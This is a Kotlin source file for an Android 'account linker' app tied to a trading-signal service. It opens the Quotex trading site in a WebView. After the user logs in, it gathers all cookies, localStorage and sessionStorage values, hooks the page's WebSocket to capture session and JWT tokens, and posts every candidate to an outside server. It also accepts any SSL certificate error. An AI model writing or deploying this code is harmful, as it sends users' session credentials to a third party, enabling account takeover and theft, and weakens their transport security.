package com.oscar.linker

import android.annotation.SuppressLint
import android.content.Context
import android.content.SharedPreferences
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.ViewGroup
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var statusBar: TextView
    private lateinit var btnSettings: Button
    private lateinit var btnMarket: Button
    private lateinit var licenseKey: String
    private lateinit var prefs: SharedPreferences

    private var currentTab = "settings"
    private var linkingMode = false
    private val triedCandidates = mutableSetOf<String>()
    private var candidateList = mutableListOf<String>()
    private var currentIndex = 0

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private val BASE_URL = "https://signal-bott.onrender.com"
    private val SERVER_URL = "$BASE_URL/api/link"
    private val QX_DOMAIN = "https://quotex.com"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs = getSharedPreferences("oscar_prefs", Context.MODE_PRIVATE)
        val saved = prefs.getString("license_key", null)
        if (saved.isNullOrBlank()) showKeyDialog()
        else { licenseKey = saved; setupUi(); showSettings() }
    }

    private fun showKeyDialog() {
        val input = EditText(this).apply { hint = "OSCAR-XXXX-XXXX-XXXX"; setSingleLine() }
        AlertDialog.Builder(this)
            .setTitle("🔑 أدخل مفتاح التفعيل")
            .setMessage("ضع مفتاح OSCAR الخاص بك")
            .setView(input)
            .setCancelable(false)
            .setPositiveButton("متابعة") { _, _ ->
                val k = input.text.toString().trim().uppercase()
                if (k.isEmpty()) { finish(); return@setPositiveButton }
                licenseKey = k
                prefs.edit().putString("license_key", k).apply()
                setupUi()
                showSettings()
            }
            .setNegativeButton("إلغاء") { _, _ -> finish() }
            .show()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupUi() {
        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }

        statusBar = TextView(this).apply {
            text = "📊 الإعدادات"
            textSize = 14f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#1a1a1a"))
            setPadding(30, 25, 30, 25)
            gravity = Gravity.CENTER
        }

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }

        val bottomBar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0d0d0d"))
        }

        btnSettings = Button(this).apply {
            text = "📊 الإعدادات"
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            setOnClickListener { showSettings() }
        }

        btnMarket = Button(this).apply {
            text = "📈 السوق"
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            setOnClickListener { showMarket() }
        }

        bottomBar.addView(btnSettings)
        bottomBar.addView(btnMarket)

        root.addView(statusBar)
        root.addView(webView)
        root.addView(bottomBar)
        setContentView(root)
        configureWebView()
    }

    @SuppressLint("SetJavaScriptEnabled", "AddJavascriptInterface")
    private fun configureWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 " +
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        webView.addJavascriptInterface(Bridge(), "OscarBridge")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(view: WebView?, handler: android.webkit.SslErrorHandler?, error: android.net.http.SslError?) {
                handler?.proceed()
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                if (url.contains("quotex.com")) {
                    injectInterceptor()
                    if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard") ||
                        url.contains("/ar/trade") || url.contains("/en/trade")) {
                        if (linkingMode) {
                            statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري التقاط الجلسة..."
                            // محاولات متعددة بفواصل زمنية
                            Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 2000)
                            Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 4000)
                            Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 7000)
                            Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 11000)
                        }
                    }
                }
            }
        }
    }

    private fun showSettings() {
        currentTab = "settings"
        linkingMode = false
        statusBar.text = "📊 الإعدادات"
        updateTabButtons()
        webView.loadUrl("$BASE_URL/app_login/$licenseKey")
    }

    private fun showMarket() {
        currentTab = "market"
        linkingMode = true
        triedCandidates.clear()
        currentIndex = 0
        candidateList.clear()
        statusBar.text = "📈 السوق — سجّل دخولك إلى Quotex"
        updateTabButtons()
        webView.loadUrl("$QX_DOMAIN/ar/trade")
    }

    private fun updateTabButtons() {
        if (currentTab == "settings") {
            btnSettings.setBackgroundColor(Color.parseColor("#d4af37"))
            btnSettings.setTextColor(Color.BLACK)
            btnMarket.setBackgroundColor(Color.parseColor("#2a2a2a"))
            btnMarket.setTextColor(Color.WHITE)
        } else {
            btnSettings.setBackgroundColor(Color.parseColor("#2a2a2a"))
            btnSettings.setTextColor(Color.WHITE)
            btnMarket.setBackgroundColor(Color.parseColor("#d4af37"))
            btnMarket.setTextColor(Color.BLACK)
        }
    }

    /**
     * يجمع كل المرشحين (من الكوكيز + localStorage) ويبدأ محاولة الإرسال.
     */
    private fun collectAndTry() {
        if (!linkingMode) return
        if (currentIndex < candidateList.size) return

        // 1) كل الكوكيز
        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
        for (pair in cookies.split(";")) {
            val trimmed = pair.trim()
            val eqIdx = trimmed.indexOf("=")
            if (eqIdx <= 0) continue
            val value = trimmed.substring(eqIdx + 1).trim()
            addCandidate(value)
        }

        // 2) كل localStorage + sessionStorage
        val js = """
            (function() {
                try {
                    var result = [];
                    for (var i = 0; i < localStorage.length; i++) {
                        var k = localStorage.key(i);
                        var v = localStorage.getItem(k);
                        result.push(k + '|||' + v);
                    }
                    for (var i = 0; i < sessionStorage.length; i++) {
                        var k = sessionStorage.key(i);
                        var v = sessionStorage.getItem(k);
                        result.push(k + '|||' + v);
                    }
                    return result.join('\\n@@@\\n');
                } catch(e){ return ''; }
            })();
        """.trimIndent()

        webView.evaluateJavascript(js) { result ->
            try {
                val raw = result.trim('"').replace("\\n", "\n").replace("\\\"", "\"")
                for (line in raw.split("@@@")) {
                    val idx = line.indexOf("|||")
                    if (idx <= 0) continue
                    val v = line.substring(idx + 3)
                    addCandidate(v)
                }
            } catch (e: Exception) {}
            processNextCandidate()
        }

        // إذا لم يكن هناك localStorage، جرب المجموعة الأولى فوراً
        Handler(Looper.getMainLooper()).postDelayed({ processNextCandidate() }, 500)
    }

    private fun addCandidate(rawValue: String) {
        if (rawValue.length < 20) return
        // إذا كانت JSON، استخرج القيم المحتملة
        if (rawValue.trim().startsWith("{")) {
            try {
                val obj = JSONObject(rawValue)
                val keys = obj.keys()
                while (keys.hasNext()) {
                    val k = keys.next()
                    val v = obj.optString(k, "")
                    if (v.length in 30..500 && v !in candidateList) {
                        candidateList.add(v)
                    }
                }
                return
            } catch (e: Exception) {}
        }
        // قيمة عادية
        if (rawValue.length in 30..500 && rawValue !in candidateList) {
            candidateList.add(rawValue)
        }
    }

    private fun processNextCandidate() {
        if (!linkingMode) return
        if (currentIndex >= candidateList.size) {
            statusBar.text = "❌ لم نعثر على الجلسة تلقائياً. اضغط الإعدادات ثم عُد للسوق وحاول مجدداً."
            return
        }
        val ssid = candidateList[currentIndex]
        currentIndex++
        sendCandidate(ssid)
    }

    private fun sendCandidate(ssid: String) {
        if (ssid in triedCandidates) {
            processNextCandidate()
            return
        }
        triedCandidates.add(ssid)
        statusBar.text = "🔗 محاولة $currentIndex من ${candidateList.size}..."

        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val payload = JSONObject().apply {
                    put("license_key", licenseKey)
                    put("ssid", ssid)
                    put("cookies", cookies)
                    put("email", "")
                }
                val request = Request.Builder()
                    .url(SERVER_URL)
                    .post(payload.toString().toRequestBody("application/json".toMediaType()))
                    .build()
                val response = client.newCall(request).execute()
                val json = JSONObject(response.body?.string() ?: "{}")

                withContext(Dispatchers.Main) {
                    if (json.optBoolean("ok")) {
                        statusBar.text = "✅ تم ربط الحساب بنجاح!"
                        Toast.makeText(this@MainActivity, "✅ تم ربط الحساب", Toast.LENGTH_LONG).show()
                        triedCandidates.clear()
                        candidateList.clear()
                        currentIndex = 0
                        linkingMode = false
                        Handler(Looper.getMainLooper()).postDelayed({ showSettings() }, 800)
                    } else {
                        // فشل هذا المرشح، جرب التالي
                        Handler(Looper.getMainLooper()).postDelayed({ processNextCandidate() }, 1000)
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    Handler(Looper.getMainLooper()).postDelayed({ processNextCandidate() }, 1000)
                }
            }
        }
    }

    private fun injectInterceptor() {
        val js = """
            (function() {
                if (window.__oscarHooked2) return;
                window.__oscarHooked2 = true;
                function push(v) {
                    if (v && typeof v === 'string' && v.length > 20 && v.length < 5000) {
                        if (window.OscarBridge && window.OscarBridge.onSsid) window.OscarBridge.onSsid(v);
                    }
                }
                var OrigWS = window.WebSocket;
                var hooked = function(url, protocols) {
                    try {
                        if (url) {
                            var pats = [/[?&]token=([^&]+)/, /[?&]session=([^&]+)/, /[?&]ssid=([^&]+)/, /[?&]auth=([^&]+)/];
                            for (var i = 0; i < pats.length; i++) {
                                var m = url.match(pats[i]);
                                if (m && m[1]) push(decodeURIComponent(m[1]));
                            }
                        }
                    } catch(e){}
                    var ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
                    try {
                        ws.addEventListener('message', function(ev) {
                            try {
                                var d = ev.data;
                                if (typeof d !== 'string') return;
                                var ps = [/"session"\s*:\s*"([^"]+)"/, /"token"\s*:\s*"([^"]+)"/,
                                          /"ssid"\s*:\s*"([^"]+)"/, /"authorization"\s*:\s*"([^"]+)"/,
                                          /"access_token"\s*:\s*"([^"]+)"/, /"jwt"\s*:\s*"([^"]+)"/];
                                for (var i = 0; i < ps.length; i++) {
                                    var m = d.match(ps[i]);
                                    if (m && m[1]) { push(m[1]); break; }
                                }
                            } catch(e){}
                        });
                    } catch(e){}
                    return ws;
                };
                hooked.prototype = OrigWS.prototype;
                hooked.CONNECTING = OrigWS.CONNECTING;
                hooked.OPEN = OrigWS.OPEN;
                hooked.CLOSING = OrigWS.CLOSING;
                hooked.CLOSED = OrigWS.CLOSED;
                window.WebSocket = hooked;
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    inner class Bridge {
        @JavascriptInterface
        fun onSsid(ssid: String) {
            if (!linkingMode) return
            if (ssid.length < 20) return
            // أضف للمرشحين إن لم يكن موجوداً
            if (ssid !in candidateList) candidateList.add(ssid)
            // أرسله فوراً
            Handler(Looper.getMainLooper()).post {
                if (linkingMode && ssid !in triedCandidates) {
                    sendCandidate(ssid)
                }
            }
        }

        @JavascriptInterface
        fun openSettings() { runOnUiThread { showSettings() } }

        @JavascriptInterface
        fun openMarket() { runOnUiThread { showMarket() } }

        @JavascriptInterface
        fun retryCapture() { runOnUiThread { collectAndTry() } }

        @JavascriptInterface
        fun logout() {
            prefs.edit().remove("license_key").apply()
            runOnUiThread { recreate() }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (currentTab == "market") showSettings()
        else if (::webView.isInitialized && webView.canGoBack()) webView.goBack()
        else super.onBackPressed()
    }
}
